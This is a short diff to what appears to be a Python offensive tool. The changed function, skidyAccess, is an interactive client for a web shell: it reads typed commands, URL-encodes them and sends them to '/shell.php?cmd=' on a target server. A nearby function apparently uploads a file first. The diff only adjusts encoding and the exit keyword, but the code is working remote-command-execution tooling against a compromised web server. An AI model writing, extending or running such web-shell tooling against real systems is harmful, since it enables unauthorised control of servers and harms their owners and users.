@@ -26,9 +26,10 @@ def skidyWeb(details):
         print("Upload failed")
 
 def skidyAccess(details):
-    cmd = ""
+    cmd = b""
+    encoding = "utf-8"
 
-    while(cmd != "fin"):
-        cmd = input("$: ")
+    while(cmd.decode(encoding).lower() != "quit"):
+        cmd = input("$: ").encode("ascii")
         cmd_encoded = urllib.parse.quote_plus(cmd)
         utils.simpleGET(details, "/shell.php?cmd=", cmd_encoded, 1)
